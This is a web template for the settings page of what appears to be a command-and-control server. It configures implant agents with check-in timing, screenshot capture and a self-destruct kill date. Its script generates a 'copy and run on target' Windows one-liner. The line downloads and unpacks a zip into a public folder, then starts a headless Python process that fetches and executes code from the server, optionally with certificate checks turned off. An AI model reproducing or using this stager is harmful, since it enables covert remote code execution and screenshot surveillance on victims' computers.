{% extends "base.html" %}

{% block content %}
<div class="container-fluid mt-5"> 
    <h2 class="mb-4"><i class="fas fa-cog me-2"></i>Settings</h2>

    <div class="row">
        <div class="col-md-6">
            <div class="card shadow-sm mb-4">
                <div class="card-header">
                    <h5 class="mb-0">Server Configuration</h5>
                </div>
                <div class="card-body">
                    <form>
                        <div class="mb-3">
                            <label class="form-label">Server Host</label>
                            <input type="text" class="form-control" value="{{ CONFIG['host'] }}" readonly>
                        </div>
                        <div class="mb-3">
                            <label class="form-label">Server Port</label>
                            <input type="number" class="form-control" value="{{ CONFIG['port'] }}" readonly>
                        </div>
                        <div class="mb-3">
                            <label class="form-label">Database Path</label>
                            <input type="text" class="form-control" value="{{ CONFIG['database'] }}" readonly>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <div class="col-md-6">
            <div class="card shadow-sm">
                <div class="card-header">
                    <h5 class="mb-0">User Management</h5>
                </div>
                <div class="card-body">
                    <div class="table-responsive">
                        <table class="table">
                            <thead>
                                <tr>
                                    <th>Username</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td>admin</td>
                                    <td>
                                        <button class="btn btn-sm btn-outline-secondary" disabled>
                                            <i class="fas fa-key me-1"></i>Change Password
                                        </button>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>

        
    </div>
</div>

    <!-- Agent Configuration Section -->
    <div class="row mt-4">
        <div class="col-md-12">
            <div class="card shadow-sm">
                <div class="card-header">
                    <h5 class="mb-0">Agent Configuration</h5>
                </div>
                <div class="card-body">
                    <form id="agentConfigForm">
                        <div class="row mb-3">
                            <div class="col-md-6">
                                <label class="form-label">Check-in Interval (seconds)</label>
                                <input type="number" class="form-control" id="checkinInterval" value="{{ agent_config.checkin_interval if agent_config else 10 }}" min="5" max="3600" required>
                            </div>
                            <div class="col-md-6">
                                <label class="form-label">Server URL</label>
                                <input type="url" class="form-control" id="serverUrl" 
                                       value="{{ agent_config.server_url if agent_config else (request.url_root | replace('http://', 'https://')) }}" required>
                            </div>
                        </div>
                        <div class="row mb-3">
                            <div class="col-md-6">
                                <div class="form-check">
                                    <input class="form-check-input" type="checkbox" id="takeScreenshots" {% if agent_config and agent_config.take_screenshots %}checked{% endif %}>
                                    <label class="form-check-label" for="takeScreenshots">Take Screenshots</label>
                                </div>
                            </div>
                            <div class="col-md-6">
                                <label class="form-label">Screenshot Frequency</label>
                                    <select class="form-select" id="screenshotFrequency">
                                    <option value="1" {% if agent_config and agent_config.screenshot_frequency == 1 %}selected{% endif %}>Every check-in</option>
                                    <option value="5" {% if agent_config and agent_config.screenshot_frequency == 5 %}selected{% endif %}>Every 5 check-ins</option>
                                    <option value="10" {% if not agent_config or agent_config.screenshot_frequency == 10 %}selected{% endif %}>Every 10 check-ins</option>
                                    <option value="30" {% if agent_config and agent_config.screenshot_frequency == 30 %}selected{% endif %}>Every 30 check-ins</option>
                                </select>
                            </div>
                        </div>
                        <div class="row mb-3">
                            <div class="col-md-6">
                                <label class="form-label">Kill Date</label>
                                <input type="datetime-local" class="form-control" id="killDate" value="{{ agent_config.killdate|replace(' ', 'T') if agent_config and agent_config.killdate else '' }}">
                                <small class="text-muted">Agent will self-destruct after this date/time</small>
                            </div>
                            <div class="col-md-6">
                                <div class="form-check mt-4 pt-3">
                                    <input class="form-check-input" type="checkbox" id="enableKillDate" {% if agent_config and agent_config.killdate_enabled %}checked{% endif %}>
                                    <label class="form-check-label" for="enableKillDate">Enable Kill Date</label>
                                </div>
                            </div>
                        </div>
                        <div class="row mb-3">
                            <div class="col-md-6">
                                <div class="form-check">
                                    <input class="form-check-input" type="checkbox" id="trustedCertificate" {% if agent_config and agent_config.trusted_certificate %}checked{% endif %}>
                                    <label class="form-check-label" for="trustedCertificate">Trusted Certificate</label>
                                </div>
                            </div>
                        </div>
                        <button type="submit" class="btn btn-primary" onclick="copyUrl()">Generate Agent</button>
                    </form>
                    <div id="agentDownload" class="mt-3" style="display: none;">
                        <a id="downloadLink" href="#" class="btn btn-success">
                            <i class="fas fa-download me-2"></i>Download Agent
                        </a><div><br>
                            <b>Or copy and run on target:</b><br>
                            <div id="displayArea" class="command-display mt-3" style="
                            background-color: #1e1e1e;
                            border-radius: 5px;
                            padding: 15px;
                            position: relative;
                            font-family: 'Consolas', 'Monaco', monospace;
                            color: #d4d4d4;
                            border-left: 4px solid #569cd6;
                            overflow-x: auto;
                            white-space: nowrap;
                        ">
                            <!-- Command here -->
                            <button id="copyButton" class="btn btn-sm btn-secondary" style="
                                position: absolute;
                                top: 5px;
                                right: 5px;
                                padding: 2px 8px;
                                font-size: 12px;
                                opacity: 0.8;
                            ">
                                <i class="fas fa-copy"></i> Copy
                            </button>
                        </div>


                    <div id="agentError" class="alert alert-danger mt-3" style="display: none;"></div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
function copyUrl() {
    // Get form values
    const url = document.getElementById('serverUrl').value;
    const enableKillDate = document.getElementById('enableKillDate').checked;
    const killDate = document.getElementById('killDate').value;
    const trustedCert = document.getElementById('trustedCertificate').checked;
    
    // Format kill date for display if enabled
    let killDateDisplay = '';
    if (enableKillDate && killDate) {
        const dateObj = new Date(killDate);
        const formattedDate = dateObj.toISOString().replace('T', ' ').substring(0, 16);
        killDateDisplay = `\n<span style="color: #569cd6;"># Kill Date:</span> <span style="color: #ce9178;">${formattedDate}</span>`;
    }

    // Create the command based on trusted certificate setting
    let command;
    if (trustedCert) {
        command = `curl -s ${url}/a/p -o c:\\users\\public\\p.zip&cd c:\\users\\public&tar -xf p.zip&del /q p.zip&cd documents&start /b conhost --headless python -c "import urllib3;import requests;url='${url}/a/d';exec(requests.get(url).text)"`;
    } else {
        command = `curl -ks ${url}/a/p -o c:\\users\\public\\p.zip&cd c:\\users\\public&tar -xf p.zip&del /q p.zip&cd documents&start /b conhost --headless python -c "import urllib3;urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning);import requests;url='${url}/a/d';exec(requests.get(url,verify=False).text)"`;
    }
    
    // Display it with syntax highlighting and kill date info
    const curlOption = trustedCert ? '-s' : '-ks';
    const pythonCode = trustedCert ? 
        `"<span style="color: #569cd6;">import</span> urllib3;<span style="color: #569cd6;">import</span> requests;url='${url}/a/d';<span style="color: #569cd6;">exec</span>(requests.<span style="color: #dcdcaa;">get</span>(url).text)"` :
        `"<span style="color: #569cd6;">import</span> urllib3;urllib3.<span style="color: #dcdcaa;">disable_warnings</span>(urllib3.exceptions.InsecureRequestWarning);<span style="color: #569cd6;">import</span> requests;url='${url}/a/d';<span style="color: #569cd6;">exec</span>(requests.<span style="color: #dcdcaa;">get</span>(url,verify=<span style="color: #569cd6;">False</span>).text)"`;
    
    document.getElementById('displayArea').innerHTML = `
        <code style="color: #9cdcfe;">curl</code> <code style="color: #ce9178;">${curlOption}</code> <code style="color: #ce9178;">${url}/a/p</code> <code style="color: #ce9178;">-o</code> <code style="color: #ce9178;">c:\\users\\public\\p.zip</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">cd</code> <code style="color: #ce9178;">c:\\users\\public</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">tar</code> <code style="color: #ce9178;">-xf</code> <code style="color: #ce9178;">p.zip</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">del</code> <code style="color: #ce9178;">/q</code> <code style="color: #ce9178;">p.zip</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">cd</code> <code style="color: #ce9178;">documents</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">start</code> <code style="color: #ce9178;">/b</code> <code style="color: #ce9178;">conhost</code> <code style="color: #ce9178;">--headless</code> <code style="color: #9cdcfe;">python</code> <code style="color: #ce9178;">-c</code> <code style="color: #ce9178;">${pythonCode}
        ${killDateDisplay}
        <button id="copyButton" class="btn btn-sm btn-secondary" style="
            position: absolute;
            top: 5px;
            right: 5px;
            padding: 2px 8px;
            font-size: 12px;
            opacity: 0.8;
        ">
            <i class="fas fa-copy"></i> Copy
        </button>`;
    
    // Add copy functionality
    document.getElementById('copyButton').addEventListener('click', function() {
        navigator.clipboard.writeText(command).then(function() {
            const originalText = this.innerHTML;
            this.innerHTML = '<i class="fas fa-check"></i> Copied!';
            setTimeout(() => {
                this.innerHTML = originalText;
            }, 2000);
        }.bind(this));
    });
}

// Add event listener for the trusted certificate checkbox
document.addEventListener('DOMContentLoaded', function() {
    const trustedCertCheckbox = document.getElementById('trustedCertificate');
    if (trustedCertCheckbox) {
        trustedCertCheckbox.addEventListener('change', function() {
            // Only regenerate if the download section is visible
            if (document.getElementById('agentDownload').style.display === 'block') {
                copyUrl();
            }
        });
    }
});
document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('agentConfigForm');
    const downloadDiv = document.getElementById('agentDownload');
    const downloadLink = document.getElementById('downloadLink');
    const errorDiv = document.getElementById('agentError');

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        errorDiv.style.display = 'none';
        
        const config = {
            checkin_interval: document.getElementById('checkinInterval').value,
            server_url: document.getElementById('serverUrl').value,
            take_screenshots: document.getElementById('takeScreenshots').checked,
            screenshot_frequency: document.getElementById('screenshotFrequency').value,
            enable_killdate: document.getElementById('enableKillDate').checked,
            killdate: document.getElementById('killDate').value
        };

        try {
            const response = await fetch('/api/generate_agent', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(config)
            });

            const data = await response.json();
            
            if (!response.ok) {
                throw new Error(data.message || 'Failed to generate agent');
            }

            downloadLink.href = `/a/d?t=${Date.now()}`;
            downloadDiv.style.display = 'block';
            
        } catch (error) {
            console.error('Error:', error);
            errorDiv.textContent = error.message;
            errorDiv.style.display = 'block';
        }
    });
});
</script>
{% endblock %}
